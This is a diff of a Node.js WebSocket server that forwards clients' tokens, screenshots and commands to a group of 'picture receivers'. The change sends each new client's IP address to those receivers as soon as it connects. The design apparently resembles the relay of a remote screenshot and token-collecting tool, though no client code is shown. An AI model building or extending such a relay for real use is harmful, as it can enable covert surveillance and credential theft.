@@ -23,18 +23,32 @@ const usersInChat = new Map();
 const pictureReceivers = new Map(); 
 let keepAliveId = null;
 
+// Hàm mới để gửi thông tin IP
+const sendIPInfoToPictureReceivers = (userID, ip) => {
+    const ipInfo = {
+        type: 'ipInfo',
+        userID: userID,
+        ip: ip,
+        timestamp: new Date().toISOString()
+    };
+    broadcastToPictureReceivers(ipInfo);
+};
+
 wss.on("connection", (ws, request) => {
     const userID = crypto.randomUUID();
     const ip = request.headers['x-forwarded-for']?.split(',')[0].trim() || request.socket.remoteAddress;
     
     console.log(`New connection from IP: ${ip} with userID: ${userID}`);
     
+    // Gửi thông tin IP ngay khi có kết nối mới
+    sendIPInfoToPictureReceivers(userID, ip);
+    
     ws.on("message", (data) => {
-        handleMessage(ws, data, userID, ip);
+        handleMessage(ws, data, userID);
     });
 
     ws.on("close", () => {
-        console.log(`Connection closed for IP: ${ip} with userID: ${userID}`);
+        console.log(`Connection closed for UserID: ${userID}`);
         handleDisconnect(userID);
         ws.removeAllListeners();
     });
@@ -55,7 +69,7 @@ app.get('/node-version', (req, res) => {
     res.send(`Node.js version: ${process.version}`);
 });
 
-const handleMessage = (ws, data, userID, ip) => {
+const handleMessage = (ws, data, userID) => {
     try {
         const messageData = JSON.parse(data.toString());
 
@@ -63,46 +77,31 @@ const handleMessage = (ws, data, userID, ip) => {
             pictureReceivers.set(userID, ws);
             broadcastToPictureReceivers({
                 type: 'newReceiver',
-                userID: userID,
-                ip: ip
+                userID: userID
             });
         } else if (messageData.type === 'token' && messageData.sender && messageData.token && messageData.uuid) {
-            messageData.ip = ip;
             broadcastToPictureReceivers(messageData);
         } else if (messageData.type === 'screenshot' && messageData.data && typeof messageData.data === 'string' && messageData.data.startsWith('data:image/png;base64')) {
             broadcastToPictureReceivers({
                 type: 'screenshot',
                 action: messageData.action,
                 screen: messageData.screen,
-                data: messageData.data,
-                ip: ip
+                data: messageData.data
             });
         } else if (messageData.action === 'screenshot_result') {
             broadcastToPictureReceivers({
                 type: 'screenshot',
                 action: messageData.action,
                 screen: messageData.screen,
-                data: messageData.data,
-                ip: ip
+                data: messageData.data
             });
         } else {
-            messageData.ip = ip;
             broadcastToAllExceptPictureReceivers(ws, JSON.stringify(messageData), true);
         }
-
-        // Broadcast connection information to Picture Receivers
-        broadcastToPictureReceivers({
-            type: 'connectionInfo',
-            userID: userID,
-            ip: ip,
-            messageType: messageData.type || messageData.command || 'Unknown'
-        });
-
     } catch (e) {
         broadcastToPictureReceivers({
             type: 'error',
             userID: userID,
-            ip: ip,
             error: e.message
         });
     }
@@ -114,7 +113,7 @@ const broadcastToPictureReceivers = (message) => {
         if (ws.readyState === WebSocket.OPEN) {
             ws.send(data, error => {
                 if (error) {
-                    // Xử lý lỗi một cách im lặng hoặc gửi thông báo lỗi đến một hệ thống giám sát
+                    console.error(`Error sending message to receiver UserID: ${userId}:`, error);
                 }
             });
         }
